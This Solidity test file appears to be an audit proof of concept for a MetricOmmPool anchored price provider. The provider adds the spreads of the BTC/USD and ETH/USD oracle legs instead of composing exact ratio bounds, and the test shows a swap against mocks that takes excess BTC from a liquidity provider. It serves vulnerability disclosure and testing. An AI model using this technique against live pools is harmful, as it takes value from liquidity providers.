// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";

import {MetricOmmPoolBaseTest, Q64} from "./MetricOmmPool.base.t.sol";
import {MetricOmmPool} from "../contracts/MetricOmmPool.sol";
import {IPriceProvider} from "../contracts/interfaces/IPriceProvider/IPriceProvider.sol";
import {BinState} from "../contracts/types/PoolStorage.sol";
import {FaithfulAnchorOracle, FaithfulAnchoredPriceProvider, IAnchorPricedOracle} from "./mocks/FaithfulAnchor.sol";

/// @dev Control provider that consumes the same valid oracle legs as AnchoredPriceProvider but composes
///      ratio bounds exactly: base low / quote high for bid and base high / quote low for ask.
contract ExactSyntheticRatioProvider is IPriceProvider {
  uint256 internal constant ORACLE_DECIMALS = 1e8;
  uint256 internal constant BPS_BASE = 1e18;
  uint256 internal constant ONE_BPS = 1e14;
  uint256 internal constant STEP_DENOM = ORACLE_DECIMALS * BPS_BASE;

  IAnchorPricedOracle public immutable oracle;
  bytes32 public immutable baseFeedId;
  bytes32 public immutable quoteFeedId;
  uint256 public immutable minMargin;
  uint256 public immutable maxRefStaleness;
  uint16 public immutable maxSpreadBps;

  address internal immutable _token0;
  address internal immutable _token1;

  error FeedStalled();

  constructor(
    address oracle_,
    bytes32 baseFeedId_,
    bytes32 quoteFeedId_,
    uint256 minMargin_,
    uint256 maxRefStaleness_,
    uint16 maxSpreadBps_,
    address token0_,
    address token1_
  ) {
    oracle = IAnchorPricedOracle(oracle_);
    baseFeedId = baseFeedId_;
    quoteFeedId = quoteFeedId_;
    minMargin = minMargin_;
    maxRefStaleness = maxRefStaleness_;
    maxSpreadBps = maxSpreadBps_;
    _token0 = token0_;
    _token1 = token1_;
  }

  function token0() external view returns (address) {
    return _token0;
  }

  function token1() external view returns (address) {
    return _token1;
  }

  function getBidAndAskPrice() external returns (uint128 bid, uint128 ask) {
    (uint256 baseMid, uint256 baseSpread, bool baseOk) = _readLeg(baseFeedId);
    (uint256 quoteMid, uint256 quoteSpread, bool quoteOk) = _readLeg(quoteFeedId);
    if (!baseOk || !quoteOk || quoteMid == 0 || baseSpread + quoteSpread > maxSpreadBps) revert FeedStalled();

    uint256 baseDown = BPS_BASE - baseSpread * ONE_BPS;
    uint256 baseUp = BPS_BASE + baseSpread * ONE_BPS;
    uint256 quoteDown = BPS_BASE - quoteSpread * ONE_BPS;
    uint256 quoteUp = BPS_BASE + quoteSpread * ONE_BPS;

    uint256 bidFactor = Math.mulDiv(baseDown, BPS_BASE, quoteUp, Math.Rounding.Floor);
    uint256 askFactor = Math.mulDiv(baseUp, BPS_BASE, quoteDown, Math.Rounding.Ceil);
    if (bidFactor <= minMargin) revert FeedStalled();
    bidFactor -= minMargin;
    askFactor += minMargin;

    uint256 syntheticMid = Math.mulDiv(baseMid, ORACLE_DECIMALS, quoteMid);
    uint256 bid256 = Math.mulDiv(syntheticMid, Q64 * bidFactor, STEP_DENOM, Math.Rounding.Floor);
    uint256 ask256 = Math.mulDiv(syntheticMid, Q64 * askFactor, STEP_DENOM, Math.Rounding.Ceil);
    if (bid256 == 0 || bid256 >= ask256 || ask256 > type(uint128).max) revert FeedStalled();
    return (SafeCast.toUint128(bid256), SafeCast.toUint128(ask256));
  }

  function _readLeg(bytes32 feedId) private returns (uint256 mid, uint256 spread, bool ok) {
    uint256 refTime;
    (mid, spread,, refTime) = oracle.price(feedId, msg.sender);
    if (
      refTime == 0 || refTime > block.timestamp || block.timestamp - refTime > maxRefStaleness || mid == 0
        || spread >= 10_000
    ) return (mid, spread, false);
    return (mid, spread, true);
  }
}

/// @notice End-to-end economic PoC for non-conservative spread composition in synthetic anchored providers.
///         Both pools consume the same fresh and valid oracle observations. The vulnerable pool uses the
///         production additive-spread design; the control pool uses exact ratio bounds.
contract MetricOmmPoolAnchorSyntheticRatioSpreadPoC is MetricOmmPoolBaseTest {
  bytes32 internal constant BTC_USD = keccak256("BTC/USD");
  bytes32 internal constant ETH_USD = keccak256("ETH/USD");

  uint256 internal constant BPS_BASE = 1e18;
  uint256 internal constant ONE_BPS = 1e14;
  uint256 internal constant MIN_MARGIN = 5e13; // 0.5 bps
  uint256 internal constant MAX_STALENESS = 60;
  uint16 internal constant MAX_SPREAD_BPS = 300;

  uint256 internal constant BTC_MID_USD8 = 65_000 * 1e8;
  uint256 internal constant ETH_MID_USD8 = 3_000 * 1e8;
  uint16 internal constant BTC_SPREAD_BPS = 0;
  uint16 internal constant ETH_SPREAD_BPS = 300;

  // The affected LP owns a current-bin position containing 1,000 token0 (BTC in the scenario).
  // The attacker spends 4,000 token1 (ETH) to buy roughly 18% of that position in one swap.
  uint256 internal constant LP_TOKEN0 = 1_000e18;
  uint128 internal constant ATTACK_INPUT_TOKEN1 = 4_000e18;

  FaithfulAnchorOracle internal anchorOracle;
  MetricOmmPool internal vulnerablePool;
  MetricOmmPool internal exactControlPool;

  function setUp() public override {
    super.setUp();
    vm.warp(1_700_000_000);

    // Both oracle legs are fresh and valid. No stale, forged, or malicious value is needed.
    anchorOracle = new FaithfulAnchorOracle();
    anchorOracle.setFeed(BTC_USD, BTC_MID_USD8, BTC_SPREAD_BPS, 0, block.timestamp);
    anchorOracle.setFeed(ETH_USD, ETH_MID_USD8, ETH_SPREAD_BPS, 0, block.timestamp);

    // The vulnerable provider mirrors production: it divides the midpoints, then adds the leg spreads.
    // The control consumes the same observations but composes the ratio bounds exactly.
    FaithfulAnchoredPriceProvider vulnerableProvider = new FaithfulAnchoredPriceProvider(
      address(anchorOracle),
      BTC_USD,
      ETH_USD,
      MIN_MARGIN,
      MAX_STALENESS,
      MAX_SPREAD_BPS,
      address(token0),
      address(token1)
    );
    ExactSyntheticRatioProvider exactProvider = new ExactSyntheticRatioProvider(
      address(anchorOracle),
      BTC_USD,
      ETH_USD,
      MIN_MARGIN,
      MAX_STALENESS,
      MAX_SPREAD_BPS,
      address(token0),
      address(token1)
    );

    vulnerablePool = _deployAnchorPool(address(vulnerableProvider));
    exactControlPool = _deployAnchorPool(address(exactProvider));
    _approveUsersForPool(address(vulnerablePool));
    _approveUsersForPool(address(exactControlPool));

    // At position zero, a fresh current bin is entirely token0. Both LP positions are identical.
    pool = vulnerablePool;
    _addLiquidity(1, 0, 0, uint104(LP_TOKEN0), 1);
    pool = exactControlPool;
    _addLiquidity(1, 0, 0, uint104(LP_TOKEN0), 2);
  }

  function test_additiveRatioSpreadCausesMediumSeverityLpLoss() public {
    emit log_string("--- Valid fresh oracle inputs ---");
    emit log_named_decimal_uint("BTC/USD midpoint", BTC_MID_USD8, 8);
    emit log_named_uint("BTC/USD spread (bps)", BTC_SPREAD_BPS);
    emit log_named_decimal_uint("ETH/USD midpoint", ETH_MID_USD8, 8);
    emit log_named_uint("ETH/USD spread (bps)", ETH_SPREAD_BPS);

    // The additive approximation misses the nonlinear denominator term 1 / (1 - quoteSpread).
    uint256 linearAskX64 = _linearSyntheticAskX64();
    uint256 exactAskX64 = _exactSyntheticAskX64();
    emit log_string("--- Synthetic BTC/ETH ask construction ---");
    emit log_named_decimal_uint("additive ask used by vulnerable provider", _x64ToWad(linearAskX64), 18);
    emit log_named_decimal_uint("exact ratio ask", _x64ToWad(exactAskX64), 18);
    emit log_named_uint("ask underestimation (bps)", Math.mulDiv(exactAskX64 - linearAskX64, 10_000, exactAskX64));

    // Execute the same exact-input purchase against identical liquidity. false means token1 -> token0:
    // the attacker buys BTC with ETH, so the underestimated ask makes the pool send too much BTC.
    (int256 vulnerableDelta0, int256 vulnerableDelta1) =
      _swapOnPool(address(vulnerablePool), 0, users[0], false, _i128ExactIn(ATTACK_INPUT_TOKEN1), type(uint128).max);
    (int256 controlDelta0, int256 controlDelta1) =
      _swapOnPool(address(exactControlPool), 0, users[0], false, _i128ExactIn(ATTACK_INPUT_TOKEN1), type(uint128).max);

    assertEq(vulnerableDelta1, controlDelta1, "both pools receive the same token1 input");
    uint256 vulnerableToken0Out = uint256(-vulnerableDelta0);
    uint256 controlToken0Out = uint256(-controlDelta0);
    assertGt(vulnerableToken0Out, controlToken0Out, "additive band gives the buyer excess token0");

    uint256 vulnerableRealizedPriceX64 = Math.mulDiv(uint256(vulnerableDelta1), Q64, vulnerableToken0Out);
    uint256 controlRealizedPriceX64 = Math.mulDiv(uint256(controlDelta1), Q64, controlToken0Out);
    emit log_string("--- Identical 4,000 ETH swaps ---");
    emit log_named_decimal_uint("token1 input to each pool", uint256(vulnerableDelta1), 18);
    emit log_named_decimal_uint("token0 out from vulnerable pool", vulnerableToken0Out, 18);
    emit log_named_decimal_uint("token0 out from exact-control pool", controlToken0Out, 18);
    emit log_named_decimal_uint("excess token0 paid to attacker", vulnerableToken0Out - controlToken0Out, 18);
    emit log_named_decimal_uint("vulnerable realized token1/token0", _x64ToWad(vulnerableRealizedPriceX64), 18);
    emit log_named_decimal_uint("control realized token1/token0", _x64ToWad(controlRealizedPriceX64), 18);

    assertLt(vulnerableRealizedPriceX64, exactAskX64, "vulnerable execution is below the valid ratio ask");
    assertGe(controlRealizedPriceX64, exactAskX64, "control execution respects the valid ratio ask");

    // Value both executions at the same correct synthetic midpoint. Both pools receive exactly 4,000 ETH,
    // so the additional BTC leaving the vulnerable pool directly reduces its earned spread income.
    uint256 syntheticMid8 = Math.mulDiv(BTC_MID_USD8, 1e8, ETH_MID_USD8);
    uint256 syntheticMidX64 = Math.mulDiv(syntheticMid8, Q64, 1e8);
    uint256 vulnerableMidValue = Math.mulDiv(vulnerableToken0Out, syntheticMidX64, Q64);
    uint256 controlMidValue = Math.mulDiv(controlToken0Out, syntheticMidX64, Q64);
    uint256 vulnerableSpreadIncome = uint256(vulnerableDelta1) - vulnerableMidValue;
    uint256 controlSpreadIncome = uint256(controlDelta1) - controlMidValue;
    uint256 lostSpreadIncome = controlSpreadIncome - vulnerableSpreadIncome;

    // Medium thresholds: more than 1% of expected LP yield and more than ten dollars. The same loss
    // also exceeds 0.01% of the affected LP principal in this concrete, factory-valid configuration.
    uint256 lossUsd18 = Math.mulDiv(lostSpreadIncome, ETH_MID_USD8, 1e8);
    uint256 lostYieldBps = Math.mulDiv(lostSpreadIncome, 10_000, controlSpreadIncome);
    uint256 initialLpValueUsd18 = Math.mulDiv(LP_TOKEN0, BTC_MID_USD8, 1e8);
    uint256 lossPpmOfLpPrincipal = Math.mulDiv(lossUsd18, 1e6, initialLpValueUsd18);

    emit log_string("--- Economic impact on the LP ---");
    emit log_named_decimal_uint("vulnerable LP spread income (ETH)", vulnerableSpreadIncome, 18);
    emit log_named_decimal_uint("exact-control LP spread income (ETH)", controlSpreadIncome, 18);
    emit log_named_decimal_uint("lost LP spread income (ETH)", lostSpreadIncome, 18);
    emit log_named_decimal_uint("lost LP spread income (USD)", lossUsd18, 18);
    emit log_named_uint("lost share of expected LP yield (bps)", lostYieldBps);
    emit log_named_uint("loss versus LP principal (ppm)", lossPpmOfLpPrincipal);

    assertGt(lostYieldBps, 100, "LP loses more than 1% of expected spread income");
    assertGt(lossPpmOfLpPrincipal, 100, "LP loses more than 0.01% of principal");
    assertGt(lossUsd18, 10e18, "lost LP value exceeds ");
  }

  function _linearSyntheticAskX64() internal pure returns (uint256) {
    uint256 syntheticMid = Math.mulDiv(BTC_MID_USD8, 1e8, ETH_MID_USD8);
    uint256 linearHalf = (uint256(BTC_SPREAD_BPS) + uint256(ETH_SPREAD_BPS)) * ONE_BPS + MIN_MARGIN;
    return Math.mulDiv(syntheticMid, Q64 * (BPS_BASE + linearHalf), 1e8 * BPS_BASE, Math.Rounding.Ceil);
  }

  function _exactSyntheticAskX64() internal pure returns (uint256) {
    uint256 syntheticMid = Math.mulDiv(BTC_MID_USD8, 1e8, ETH_MID_USD8);
    uint256 baseUp = BPS_BASE + uint256(BTC_SPREAD_BPS) * ONE_BPS;
    uint256 quoteDown = BPS_BASE - uint256(ETH_SPREAD_BPS) * ONE_BPS;
    uint256 exactAskFactor = Math.mulDiv(baseUp, BPS_BASE, quoteDown, Math.Rounding.Ceil) + MIN_MARGIN;
    return Math.mulDiv(syntheticMid, Q64 * exactAskFactor, 1e8 * BPS_BASE, Math.Rounding.Ceil);
  }

  function _x64ToWad(uint256 priceX64) internal pure returns (uint256) {
    return Math.mulDiv(priceX64, 1e18, Q64);
  }

  function _deployAnchorPool(address priceProvider) internal returns (MetricOmmPool deployedPool) {
    (BinState[] memory nonNegative, BinState[] memory negative) = _defaultBinStateArrays();
    deployedPool = _deployPoolAndRegister(
      PoolDeployParams({
        priceProvider: priceProvider,
        extensions: _emptyExtensions(),
        extensionOrders: _emptyExtensionOrders(),
        immutablePriceProvider: true,
        protocolSpreadFeeE6: 0,
        adminSpreadFeeE6: 0,
        curBinDistFromProvidedPriceE6: 0,
        nonNegativeBinStates: nonNegative,
        negativeBinStates: negative,
        protocolNotionalFeeE8: 0,
        adminNotionalFeeE8: 0,
        immutablePriceProviderForRegistry: priceProvider,
        lowestBin: -1,
        highestBin: 0
      })
    );
  }
}
